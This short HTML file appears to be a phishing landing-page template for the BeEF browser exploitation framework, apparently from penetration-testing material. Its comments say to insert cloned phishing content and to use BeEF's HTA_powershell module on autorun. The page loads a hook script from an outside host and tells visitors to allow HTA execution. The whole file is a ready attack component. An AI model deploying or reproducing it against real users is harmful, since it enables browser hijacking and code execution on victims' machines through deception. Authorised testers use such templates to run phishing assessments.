<!DOCTYPE html>
<!--
-- NOTE: replace this HTML index stub with the phishing content of a website of choice.
-- NOTE: Remember to also add the BeEF hook (I've changed it to jquery.js, you can configure that), and use
--       the HTA_powershell BeEF module with "autorun: true" and "xhr_poll_timeout: 1000" for best results.
-->
<html xmlns="http://www.w3.org/1999/xhtml">
 <head>
 <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
 <script type="text/javascript" src="http://knox.pentestgeek.com:3000/hook.js"></script>
 </head>
 <body>
    <b>If you allow HTA execution, I will give you some BeEF!</b>
 </body>
</html>
